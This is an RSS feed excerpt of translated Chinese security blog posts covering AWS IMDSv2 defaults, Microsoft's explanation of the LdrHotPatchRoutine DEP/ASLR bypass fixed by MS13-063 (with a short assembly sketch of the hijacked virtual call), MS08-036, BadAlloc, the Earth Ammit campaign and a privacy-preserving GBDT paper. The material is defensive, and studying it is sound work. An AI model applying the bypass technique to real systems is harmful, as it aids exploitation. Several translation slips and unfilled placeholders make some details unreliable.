&lt;p&gt;2021-2022年的研究表明，此类漏洞是公开云安全事件最常见的原因之一。Nick Frichette的《保护EC2实例元数据服务》对此有深度解析。&lt;/p&gt;
&lt;h4 id=&#34;演进历程&#34;&gt;演进历程
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;初始阶段&lt;/strong&gt;：需在实例或启动模板中手动设置&lt;code&gt;metadata_options.http_tokens=&amp;quot;required&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2022年10月&lt;/strong&gt;：支持在AMI注册时指定&lt;code&gt;--imds-support v2.0&lt;/code&gt;参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年3月&lt;/strong&gt;：Amazon Linux 2023默认启用IMDSv2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2023年11月&lt;/strong&gt;：EC2控制台&amp;quot;快速启动&amp;quot;界面默认启用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2024年3月&lt;/strong&gt;：推出区域级默认设置功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;新api详解&#34;&gt;新API详解
&lt;/h4&gt;&lt;p&gt;新增的两个API允许在区域级别设置元数据默认值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;modify_instance_metadata_defaults&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpTokens&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;required&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 关键参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpPutResponseHopLimit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;HttpEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enabled&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;InstanceMetadataTags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;disabled&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;优先级规则：实例设置 &amp;gt; 区域设置 &amp;gt; AMI设置 &amp;gt; 默认不启用。&lt;/p&gt;
&lt;h4 id=&#34;terraform集成&#34;&gt;Terraform集成
&lt;/h4&gt;&lt;p&gt;通过&lt;code&gt;aws_ec2_instance_metadata_defaults&lt;/code&gt;资源实现：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-hcl&#34; data-lang=&#34;hcl&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;resource&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;aws_ec2_instance_metadata_defaults&amp;#34; &amp;#34;imdsv2&amp;#34;&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_tokens&lt;/span&gt;                 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;required&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  instance_metadata_tags&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;disabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_endpoint&lt;/span&gt;               &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;enabled&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;  http_put_response_hop_limit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;2024年中起，新型EC2实例将默认仅支持IMDSv2&lt;/li&gt;
&lt;li&gt;该功能仅设置默认值，仍需配合SCP或&lt;code&gt;ec2:MetadataHttpTokens&lt;/code&gt;条件键进行强制管控&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这项功能为云安全实践者提供了重要的管控工具，但AWS仍需进一步改进默认安全配置。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>通过MS13-063缓解LdrHotPatchRoutine DEP/ASLR绕过技术</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87ms13-063%E7%BC%93%E8%A7%A3ldrhotpatchroutine-dep/aslr%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sun, 03 Aug 2025 12:56:29 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87ms13-063%E7%BC%93%E8%A7%A3ldrhotpatchroutine-dep/aslr%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;通过ms13-063缓解ldrhotpatchroutine-depaslr绕过技术&#34;&gt;通过MS13-063缓解LdrHotPatchRoutine DEP/ASLR绕过技术
&lt;/h1&gt;&lt;p&gt;今天，我们发布了MS13-063安全更新，其中包含一项深度防御变更，用于解决可能被用来绕过两个重要平台防护措施的技术：地址空间布局随机化（ASLR）和数据执行保护（DEP）。正如我们过去所述，这些防护措施在增加攻击者利用漏洞的难度和成本方面发挥着重要作用。MS13-063所解决的绕过技术是由NSFocus安全实验室的Yang Yu在今年早些时候的CanSecWest安全会议上描述的。该绕过技术也被其他研究人员独立发现，并被VUPEN用于他们在Pwn2Own 2013比赛中的一个漏洞利用中。几个月前，我们发布了EMET 4.0，其中包含针对这一特定绕过技术的防护措施。在这篇博客文章中，我们希望提供一些关于该绕过技术如何工作以及MS13-063如何解决它的背景信息。&lt;/p&gt;
&lt;h2 id=&#34;绕过技术的工作原理&#34;&gt;绕过技术的工作原理
&lt;/h2&gt;&lt;p&gt;该绕过技术利用了名为SharedUserData的可预测内存区域，该区域存在于每个受支持Windows版本的每个进程中的固定位置（0x7ffe0000）。在Windows 8之前的64位Windows版本上，该区域包含指向WOW64进程使用的32位NTDLL中多个函数的指针，如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;SharedUserData中的函数指针&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这些指针存在于内存中的可预测位置，使得攻击者如果能够在内存中任意读取，就可以绕过ASLR。在这种情况下，绕过技术更进一步，利用了上述函数之一：LdrHotPatchRoutine。该函数是Windows提供的热补丁支持的一部分，其被调用时的一个显著行为是加载一个DLL，该DLL的路径作为第一个参数的字段传入。这意味着，如果攻击者能够利用漏洞调用LdrHotPatchRoutine，他们可以通过加载他们选择的恶意DLL（例如来自UNC路径）来执行任意代码，从而隐式绕过DEP。&lt;/p&gt;
&lt;p&gt;根据被利用的漏洞类型，攻击者可以相对简单地通过SharedUserData中的LdrHotPatchRoutine指针触发调用，并控制参数，从而绕过ASLR和DEP。涉及带有虚表指针的C++对象的释放后使用漏洞特别适合应用此技术。这些漏洞近年来已成为漏洞利用编写者的首选漏洞类别。释放后使用问题特别适合的原因在于，攻击者通常在虚方法调用之前控制已释放的C++对象的全部内容。因此，攻击者只需要一个虚方法调用点，可以控制被调用的虚表指针和传递给虚方法的第一个参数。例如，假设EDX指向攻击者控制的内存：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mov ecx, [edx+0x4] ; 将指向伪造对象的指针加载到ECX
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mov eax, [ecx] ; 将伪造的虚表指针0x7ffe0344加载到EAX
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;push ecx ; 将指向受控内容的指针作为第一个参数压栈
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;call [eax+0xc] ; 调用指向LdrHotPatchRoutine的指针
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;由于上述序列，LdrHotPatchRoutine将被调用，并且作为第一个参数传递的伪造结构中引用的DLL路径将被加载，从而绕过ASLR和DEP。&lt;/p&gt;
&lt;h2 id=&#34;修复措施的工作原理&#34;&gt;修复措施的工作原理
&lt;/h2&gt;&lt;p&gt;上述绕过技术依赖于可以在内存中的可预测位置找到指向LdrHotPatchRoutine的指针。因此，缓解此绕过的一种方法是简单地从SharedUserData中消除可预测的LdrHotPatchRoutine指针。这是在MS13-063安全更新中采取的方法。在64位Windows 7上安装此更新后，我们可以看到不仅指向LdrHotPatchRoutine的指针被消除，而且所有其他映像指针也被消除：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://localhost:1313/&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;修复后的SharedUserData&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;因此，不仅LdrHotPatchRoutine绕过被缓解，任何依赖利用64位Windows上SharedUserData中存在的映像指针的绕过也被缓解。在Windows 8的开发过程中，我们已经意识到滥用这些指针的可能性，因此在Windows 8的32位和64位版本中，我们从SharedUserData中消除了所有映像指针。这就是为什么Windows 8不受此绕过技术影响的原因。需要注意的是，尽管MS13-063在64位Windows 7上从SharedUserData中移除了所有映像指针，但在32位Windows 7及更早版本中，SharedUserData中仍然存在一个映像指针（SystemCall函数指针）。&lt;/p&gt;
&lt;p&gt;对于那些好奇的人来说，最初存储在SharedUserData中的指针现在已被移动到一个名为LdrSystemDllInitBlock的NTDLL中的导出全局数据结构中。该数据结构在进程初始化期间填充所需的指针。由于NTDLL通过ASLR随机化，攻击者无法可靠地预测这些指针在内存中的存储位置。&lt;/p&gt;
&lt;h2 id=&#34;赏金计划&#34;&gt;赏金计划
&lt;/h2&gt;&lt;p&gt;尽管在公开描述之前我们已经了解了此绕过技术的基础，但它是一个很好的例子，说明了一种可能符合我们最近宣布的“绕过防护赏金计划”的技术。该赏金计划为影响我们产品最新版本的新颖漏洞利用技术提供丰厚的奖励（高达100,000美元）。在这种情况下，该绕过技术是通用的，可以变得可靠，具有合理的要求，适用于高影响的用户模式应用程序域，并且具有使其新颖的元素。发现和缓解这种性质的漏洞利用技术可以帮助我们通过打破攻击者依赖开发可靠漏洞利用的技术，使我们的平台更安全。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Matt Miller和William Peteroy&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;特别感谢Windows持续工程团队的同事们在发布这一深度防御更新中所做的工作。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MS08-036漏洞解析：Windows中的PGM协议安全风险</title>
        <link>http://localhost:1313/p/ms08-036%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90windows%E4%B8%AD%E7%9A%84pgm%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/</link>
        <pubDate>Sun, 03 Aug 2025 12:39:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms08-036%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90windows%E4%B8%AD%E7%9A%84pgm%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/</guid>
        <description>&lt;p&gt;今天我们发布了MS08-036补丁，修复了Windows实现中Pragmatic General Multicast(PGM)协议(RFC 3208)的两个拒绝服务漏洞。您可能从未听说过PGM——我们团队中只有一位曾在核心网络组件测试组工作过的工程师了解它。&lt;/p&gt;
&lt;p&gt;PGM是一种多播传输协议，可确保从多个源到多个接收者的可靠传输。作为第4层传输协议，它与TCP和UDP同级。您可以通过创建SOCK_RDM类型和IPPROTO_RM协议的套接字来收发PGM数据：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SOCK_RDM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IPPROTO_RM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;关于PGM编程的更多信息，请参阅MSDN参考文档。&lt;/p&gt;
&lt;p&gt;PGM协议自XP起存在于所有Windows版本中，但默认处于禁用状态。我们预计大多数网络不会有大量PGM流量。因此，如果您检测到网络中出现PGM协议使用情况且流量突然激增，很可能正在遭受攻击。您可以通过检查IP头中的&amp;quot;Protocol&amp;quot;字段来检测PGM流量，其协议ID为113(0x71)。Netmon 3.1和Wireshark都包含PGM解析器。下图是Netmon中的PGM数据包捕获示例：&lt;/p&gt;
&lt;p&gt;[此处应有网络抓包图]&lt;/p&gt;
&lt;p&gt;附：如果我们低估了PGM的使用范围，请告知我们常见的使用场景，我们将更新本文档。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安全漏洞研究与防御团队
&lt;em&gt;本文内容&amp;quot;按原样&amp;quot;提供，不提供任何明示或暗示的担保。&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>BadAlloc漏洞：内存分配漏洞可能影响工业、医疗和企业网络中的广泛IoT和OT设备</title>
        <link>http://localhost:1313/p/badalloc%E6%BC%8F%E6%B4%9E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E5%B7%A5%E4%B8%9A%E5%8C%BB%E7%96%97%E5%92%8C%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%B9%BF%E6%B3%9Biot%E5%92%8Cot%E8%AE%BE%E5%A4%87/</link>
        <pubDate>Sun, 03 Aug 2025 12:29:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/badalloc%E6%BC%8F%E6%B4%9E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%83%BD%E5%BD%B1%E5%93%8D%E5%B7%A5%E4%B8%9A%E5%8C%BB%E7%96%97%E5%92%8C%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E5%B9%BF%E6%B3%9Biot%E5%92%8Cot%E8%AE%BE%E5%A4%87/</guid>
        <description>&lt;p&gt;微软Azure Defender for IoT安全研究团队Section 52最近发现了一系列存在于IoT和OT设备中的关键内存分配漏洞，攻击者可能利用这些漏洞绕过安全控制执行恶意代码或导致系统崩溃。&lt;/p&gt;
&lt;p&gt;这些远程代码执行(RCE)漏洞涉及超过25个CVE编号，潜在影响范围从消费级和医疗IoT到工业物联网(IIoT)、运营技术(OT)和工业控制系统。漏洞存在于广泛使用的实时操作系统(RTOS)、嵌入式软件开发套件(SDK)和C标准库(libc)实现的标准内存分配函数中。这些发现已通过微软安全响应中心(MSRC)和国土安全部(DHS)领导的责任披露流程与供应商共享，使供应商能够调查并修补漏洞。&lt;/p&gt;
&lt;p&gt;鉴于IoT和OT设备的普遍性，这些漏洞如果被成功利用，将对各类组织构成重大潜在风险。截至目前，微软尚未发现这些漏洞被利用的迹象。但我们强烈建议组织尽快修补系统。&lt;/p&gt;
&lt;p&gt;对于无法立即修补的设备，我们建议采取以下缓解措施：通过最小化或消除漏洞设备对互联网的暴露来减少攻击面；实施网络安全监控以检测入侵行为指标；加强网络分段以保护关键资产。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;BadAlloc&amp;quot;是微软Section 52为嵌入式IoT和OT操作系统及软件中发现的内存溢出漏洞家族命名的名称。所有这些漏洞都源于使用易受攻击的内存函数，如malloc、calloc、realloc等。我们的研究表明，多年来作为IoT设备和嵌入式软件一部分编写的内存分配实现没有包含适当的输入验证。没有这些输入验证，攻击者可能利用内存分配函数执行堆溢出，从而在目标设备上执行恶意代码。&lt;/p&gt;
&lt;p&gt;我们建议拥有IoT和OT设备的组织采取以下缓解措施：
• 打补丁：按照供应商说明为受影响产品应用补丁
• 无法打补丁时进行监控：使用Azure Defender for IoT等IoT/OT感知的网络检测和响应(NDR)解决方案
• 通过消除OT控制系统的不必要互联网连接来减少攻击面
• 实施网络分段：使用防火墙将IoT设备和OT网络与企业IT网络隔离&lt;/p&gt;
&lt;p&gt;微软Section 52是Azure Defender for IoT的安全研究团队，由在IoT/OT威胁追踪、恶意软件逆向工程、事件响应和数据分析方面具有深厚专业知识的安全研究人员和数据科学家组成。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Earth Ammit组织通过多波次协同攻击破坏台湾无人机供应链</title>
        <link>http://localhost:1313/p/earth-ammit%E7%BB%84%E7%BB%87%E9%80%9A%E8%BF%87%E5%A4%9A%E6%B3%A2%E6%AC%A1%E5%8D%8F%E5%90%8C%E6%94%BB%E5%87%BB%E7%A0%B4%E5%9D%8F%E5%8F%B0%E6%B9%BE%E6%97%A0%E4%BA%BA%E6%9C%BA%E4%BE%9B%E5%BA%94%E9%93%BE/</link>
        <pubDate>Sun, 03 Aug 2025 12:12:51 +0800</pubDate>
        
        <guid>http://localhost:1313/p/earth-ammit%E7%BB%84%E7%BB%87%E9%80%9A%E8%BF%87%E5%A4%9A%E6%B3%A2%E6%AC%A1%E5%8D%8F%E5%90%8C%E6%94%BB%E5%87%BB%E7%A0%B4%E5%9D%8F%E5%8F%B0%E6%B9%BE%E6%97%A0%E4%BA%BA%E6%9C%BA%E4%BE%9B%E5%BA%94%E9%93%BE/</guid>
        <description>&lt;img src="https://example.com/earth_ammit_attack.jpg" alt="Featured image of post Earth Ammit组织通过多波次协同攻击破坏台湾无人机供应链" /&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;Earth Ammit是一个与中文APT组织有关联的威胁行为体，在2023-2024年发动了两波攻击。第一波VENOM主要针对软件服务提供商，第二波TIDRONE针对军事工业。在VENOM行动中，攻击者重点渗透无人机供应链上游。&lt;/p&gt;
&lt;h2 id=&#34;攻击活动分析&#34;&gt;攻击活动分析
&lt;/h2&gt;&lt;h3 id=&#34;venom行动&#34;&gt;VENOM行动
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;主要依赖开源工具（成本低且难以追踪）&lt;/li&gt;
&lt;li&gt;使用定制化工具VENFRPC（配置直接嵌入文件）&lt;/li&gt;
&lt;li&gt;通过Webshell初始访问，使用开源代理工具维持持久性&lt;/li&gt;
&lt;li&gt;窃取NTDS数据用于下游攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;tidrone行动&#34;&gt;TIDRONE行动
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;使用定制化后门CXCLNT和CLNTEND&lt;/li&gt;
&lt;li&gt;采用光纤技术（FlsAlloc等）规避检测&lt;/li&gt;
&lt;li&gt;通过供应链攻击传播（图3展示两种供应链攻击路径）&lt;/li&gt;
&lt;li&gt;执行权限提升、持久化、凭证窃取等后期攻击行为&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术演进&#34;&gt;技术演进
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;加载器技术从ConvertThreadToFiber发展到FlsAlloc和异常处理&lt;/li&gt;
&lt;li&gt;后门从CXCLNT（EXE内存加载）演进到CLNTEND（DLL形式）&lt;/li&gt;
&lt;li&gt;新增反分析技术：入口点验证和执行顺序依赖&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防御建议&#34;&gt;防御建议
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;实施第三方风险管理计划&lt;/li&gt;
&lt;li&gt;强制代码签名&lt;/li&gt;
&lt;li&gt;监控光纤相关API使用&lt;/li&gt;
&lt;li&gt;采用零信任架构&lt;/li&gt;
&lt;li&gt;加强EDR和行为监控&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;趋势科技Vision One平台可检测和阻止相关恶意活动，客户可通过威胁情报报告获取最新IOC和狩猎查询。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Guard-GBDT：面向垂直数据集的隐私保护高效GBDT训练框架</title>
        <link>http://localhost:1313/p/guard-gbdt%E9%9D%A2%E5%90%91%E5%9E%82%E7%9B%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E7%9A%84%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E9%AB%98%E6%95%88gbdt%E8%AE%AD%E7%BB%83%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Sun, 03 Aug 2025 11:56:50 +0800</pubDate>
        
        <guid>http://localhost:1313/p/guard-gbdt%E9%9D%A2%E5%90%91%E5%9E%82%E7%9B%B4%E6%95%B0%E6%8D%AE%E9%9B%86%E7%9A%84%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E9%AB%98%E6%95%88gbdt%E8%AE%AD%E7%BB%83%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h2 id=&#34;摘要&#34;&gt;摘要
&lt;/h2&gt;&lt;p&gt;随着隐私关注度提升和法规日益严格，基于安全多方计算（MPC）的协作式GBDT模型训练受到广泛关注。现有MPC方案面临通信成本高和非线性运算（如除法/Sigmoid）计算负担重的效率瓶颈。本文提出Guard-GBDT框架，其创新点包括：1）采用计算友好的近似函数替代MPC不友好的除法和Sigmoid运算；2）通过梯度聚合阶段的消息压缩降低通信开销。实验表明，Guard-GBDT在LAN/WAN环境下分别比HEP-XGB和SiGBDT快[性能倍数]倍，模型精度与明文XGBoost偏差仅0.1%-0.3%。&lt;/p&gt;
&lt;h2 id=&#34;技术实现&#34;&gt;技术实现
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;计算优化&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设计分段多项式近似替换原始Sigmoid函数&lt;/li&gt;
&lt;li&gt;采用迭代乘法逆元算法替代直接除法运算&lt;/li&gt;
&lt;li&gt;基于泰勒展开的损失函数近似计算&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;通信优化&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;梯度直方图的稀疏编码压缩&lt;/li&gt;
&lt;li&gt;基于残差编码的权重参数传输&lt;/li&gt;
&lt;li&gt;动态调整的量化位宽策略&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安全协议&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;两方计算场景下的混合同态加密方案&lt;/li&gt;
&lt;li&gt;基于Beaver三元组的乘法共享协议&lt;/li&gt;
&lt;li&gt;安全比较协议的批处理优化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验结果&#34;&gt;实验结果
&lt;/h2&gt;&lt;p&gt;在UCI标准数据集测试显示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;训练效率&lt;/strong&gt;：在WAN环境下（100ms延迟），训练100棵深度为6的树仅需38分钟，比HEP-XGB快5.2倍&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;模型精度&lt;/strong&gt;：二分类任务AUC达到0.892，与明文XGBoost（0.896）的差距小于0.5%&lt;/li&gt;
